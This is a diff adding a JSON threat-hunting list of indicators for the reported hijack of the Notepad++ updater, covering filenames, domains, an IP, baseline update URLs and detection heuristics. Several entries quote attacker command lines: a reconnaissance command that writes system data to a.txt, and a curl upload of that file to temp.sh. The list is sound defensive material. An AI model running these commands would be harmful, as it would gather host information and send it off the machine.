@@ -1,0 +1,276 @@
+[
+  {
+    "indicator": "IOC_CAUTIONS",
+    "type": "meta",
+    "attributed_to": "Hunt guidance",
+    "source_urls": [
+      "https://notepad-plus-plus.org/news/v889-released/",
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "analysis caveat",
+    "notes": "Indicators here are based on limited incident reporting and may be incident-specific; validate with process lineage, signer metadata, and time alignment before action. Domain/IP ownership can change and should be revalidated at time of use. Public sources reviewed did not publish malicious hashes."
+  },
+  {
+    "indicator": "AutoUpdater.exe",
+    "type": "filename",
+    "attributed_to": "Reported malicious updater dropped via hijacked WinGUp update chain",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://www.heise.de/en/news/Notepad-updater-installed-malware-11109726.html",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://securityaffairs.com/185622/hacking/notepad-fixed-updater-bugs-that-allowed-malicious-update-hijacking.html",
+      "https://cyber.gov.rw/updates/article/security-alert-notepad-update-vulnerability-enables-malware-installation/"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "payload execution / post-update activity",
+    "notes": "Observed in user TEMP and associated with reported malicious update behavior; forum report notes the AutoUpdater.exe hash was unknown. Treat as supporting signal pending validation."
+  },
+  {
+    "indicator": "update.exe",
+    "type": "filename",
+    "attributed_to": "Reported suspicious updater binary in TEMP tied to WinGUp hijack reports",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://doublepulsar.com/small-numbers-of-notepad-users-reporting-security-woes-371d7a3fd2d9",
+      "https://cyber.gov.rw/updates/article/security-alert-notepad-update-vulnerability-enables-malware-installation/",
+      "https://www.heise.de/en/news/Notepad-updater-installed-malware-11109726.html",
+      "https://securityaffairs.com/185622/hacking/notepad-fixed-updater-bugs-that-allowed-malicious-update-hijacking.html"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution / staging",
+    "notes": "Secondary reporting only; use as supporting signal and validate with process chain and signer metadata."
+  },
+  {
+    "indicator": "temp.sh",
+    "type": "domain",
+    "attributed_to": "Reported exfil destination in user reports and secondary writeups",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://hackmag.com/news/notepad-bug",
+      "https://securityaffairs.com/185622/hacking/notepad-fixed-updater-bugs-that-allowed-malicious-update-hijacking.html"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "exfiltration destination",
+    "notes": "Reported in forum-referenced incidents; treat as incident-specific until corroborated."
+  },
+  {
+    "indicator": "https://temp.sh/upload",
+    "type": "url",
+    "attributed_to": "Reported exfil upload URL used by AutoUpdater.exe via curl.exe",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "exfiltration endpoint",
+    "notes": "Forum report shows curl.exe posting a.txt to this endpoint; validate via correlated process and network telemetry."
+  },
+  {
+    "indicator": "51.91.79.17",
+    "type": "ip",
+    "attributed_to": "Reported blocklisted IP associated with temp.sh in forum report",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "exfiltration infrastructure (reported)",
+    "notes": "Forum post references temp.sh likely corresponding to this IP; treat as incidental and verify current ownership before action."
+  },
+  {
+    "indicator": "curl.exe -F \"file=@a.txt\" -s https://temp.sh/upload",
+    "type": "command_line",
+    "attributed_to": "Reported exfil command from forum incident",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "exfiltration",
+    "notes": "Use as a high-fidelity correlation with AutoUpdater.exe and GUP.exe lineage; confirm user context."
+  },
+  {
+    "indicator": "\"C:\\\\Program Files\\\\Notepad++\\\\updater\\\\gup.exe\" -v8.84 -px64",
+    "type": "command_line",
+    "attributed_to": "Reported GUP.exe invocation preceding AutoUpdater.exe",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "update chain context",
+    "notes": "Illustrative example from a single report; treat as context rather than a strict IOC."
+  },
+  {
+    "indicator": "\"C:\\\\Users\\\\[user]\\\\AppData\\\\Local\\\\Temp\\\\AutoUpdater.exe\" /closeRunningNpp /S /runNppAfterSilentInstall",
+    "type": "command_line",
+    "attributed_to": "Reported AutoUpdater.exe execution arguments",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution context",
+    "notes": "Specific to forum report; match loosely with Temp path patterns and parent/child lineage."
+  },
+  {
+    "indicator": "a.txt",
+    "type": "filename",
+    "attributed_to": "Reported exfil staging file during malicious update activity",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://hackmag.com/news/notepad-bug"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "exfil staging",
+    "notes": "Observed in reports of compromised updater behavior; validate with correlated process and network activity."
+  },
+  {
+    "indicator": "cmd /c (netstat -ano|systeminfo|tasklist|whoami) >> a.txt",
+    "type": "command_line",
+    "attributed_to": "Reported reconnaissance commands executed by AutoUpdater.exe",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://hackmag.com/news/notepad-bug"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "discovery",
+    "notes": "Reported in incident recaps; use as supporting signal and correlate with updater lineage."
+  },
+  {
+    "indicator": "netstat.exe",
+    "type": "process",
+    "attributed_to": "Reported recon commands executed by malicious updater",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "discovery",
+    "notes": "Use as supporting signal only; common administrative command. Correlate with updater process ancestry."
+  },
+  {
+    "indicator": "systeminfo.exe",
+    "type": "process",
+    "attributed_to": "Reported recon commands executed by malicious updater",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "discovery",
+    "notes": "Use as supporting signal only; common administrative command. Correlate with updater process ancestry."
+  },
+  {
+    "indicator": "tasklist.exe",
+    "type": "process",
+    "attributed_to": "Reported recon commands executed by malicious updater",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "discovery",
+    "notes": "Use as supporting signal only; common administrative command. Correlate with updater process ancestry."
+  },
+  {
+    "indicator": "whoami.exe",
+    "type": "process",
+    "attributed_to": "Reported recon commands executed by malicious updater",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "discovery",
+    "notes": "Use as supporting signal only; common administrative command. Correlate with updater process ancestry."
+  },
+  {
+    "indicator": "GUP.exe network to non-Notepad++/GitHub domains",
+    "type": "behavior",
+    "attributed_to": "Guidance to flag unexpected updater network destinations",
+    "source_urls": [
+      "https://doublepulsar.com/small-numbers-of-notepad-users-reporting-security-woes-371d7a3fd2d9",
+      "https://www.heise.de/en/news/Notepad-updater-installed-malware-11109726.html",
+      "https://securityaffairs.com/185622/hacking/notepad-fixed-updater-bugs-that-allowed-malicious-update-hijacking.html"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "exfiltration / C2 candidate",
+    "notes": "Heuristic: update traffic should normally hit notepad-plus-plus.org or GitHub release domains; investigate deviations."
+  },
+  {
+    "indicator": "GUP.exe spawning non-Notepad++ executables",
+    "type": "behavior",
+    "attributed_to": "Guidance to flag unusual child processes launched by GUP.exe",
+    "source_urls": [
+      "https://www.heise.de/en/news/Notepad-updater-installed-malware-11109726.html",
+      "https://securityaffairs.com/185622/hacking/notepad-fixed-updater-bugs-that-allowed-malicious-update-hijacking.html"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution / defense evasion",
+    "notes": "Heuristic: GUP.exe should typically launch only explorer.exe and Notepad++ installers; investigate other child processes."
+  },
+  {
+    "indicator": "https://notepad-plus-plus.org/update/getDownloadUrl.php",
+    "type": "url",
+    "attributed_to": "Official WinGUp update URL referenced in reporting of hijacked update traffic",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://notepad-plus-plus.org/news/v889-released/",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "update manifest retrieval (baseline reference)",
+    "notes": "Baseline updater endpoint; deviations or redirections from this path are the suspicious condition."
+  },
+  {
+    "indicator": "https://notepad-plus-plus.org/update/getDownloadUrl.php?version=<versionnumber>",
+    "type": "url",
+    "attributed_to": "Reported WinGUp update URL format used to retrieve XML with download location",
+    "source_urls": [
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "update manifest retrieval (baseline reference)",
+    "notes": "Used by WinGUp to request update metadata; intercepting or modifying the response is the suspected hijack path."
+  },
+  {
+    "indicator": "notepad-plus-plus.org",
+    "type": "domain",
+    "attributed_to": "Official update domain referenced in Notepad++ release notes",
+    "source_urls": [
+      "https://notepad-plus-plus.org/news/v889-released/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "update infrastructure (baseline reference)",
+    "notes": "Expected update domain for WinGUp. Use as a baseline for comparison rather than a malicious IOC."
+  },
+  {
+    "indicator": "github.com",
+    "type": "domain",
+    "attributed_to": "Official Notepad++ release hosting (baseline)",
+    "source_urls": [
+      "https://notepad-plus-plus.org/news/v889-released/",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "update infrastructure (baseline reference)",
+    "notes": "Official release hosting and assets; use as a baseline for normal updater traffic."
+  },
+  {
+    "indicator": "release-assets.githubusercontent.com",
+    "type": "domain",
+    "attributed_to": "GitHub release asset hosting (baseline)",
+    "source_urls": [
+      "https://notepad-plus-plus.org/news/v889-released/",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "update infrastructure (baseline reference)",
+    "notes": "Expected CDN domain for GitHub release assets; deviations should be investigated."
+  }
+]
